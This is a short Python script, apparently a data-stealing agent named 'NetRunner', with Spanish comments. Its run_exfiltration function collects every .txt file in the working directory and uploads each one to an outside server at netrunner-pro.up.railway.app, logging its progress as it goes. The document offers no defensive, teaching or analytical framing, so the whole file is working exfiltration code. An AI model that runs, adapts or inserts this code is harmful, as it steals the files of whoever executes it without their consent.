import os
import time
import requests
import json
import base64
import sys
import glob

# URL corregida (Sin el símbolo '>' al final)
SERVER_URL = "https://netrunner-pro.up.railway.app"
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"

def log(message):
    print(f"[*] {message}")
    try:
        # Fíjate: 'with' tiene 8 espacios y 'f.write' tiene 12
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}\n')
    except Exception as e:
        print(f"Error writing to log file: {e}")

def run_exfiltration():
    log("Iniciando búsqueda de archivos...")
    files = glob.glob("*.txt")
    for file_path in files:
        if "sync_log" in file_path: continue
        try:
            log(f"Intentando subir: {file_path}")
            with open(file_path, 'rb') as f:
                r = requests.post(UPLOAD_ENDPOINT, files={'file': f})
            log(f"Respuesta del servidor: {r.status_code}")
        except Exception as e:
            log(f"Error subiendo {file_path}: {e}")

if __name__ == "__main__":
    log("Agente NetRunner Iniciado")
    run_exfiltration()
    log("Proceso terminado. Cerrando en 10 segundos...")
    time.sleep(10)
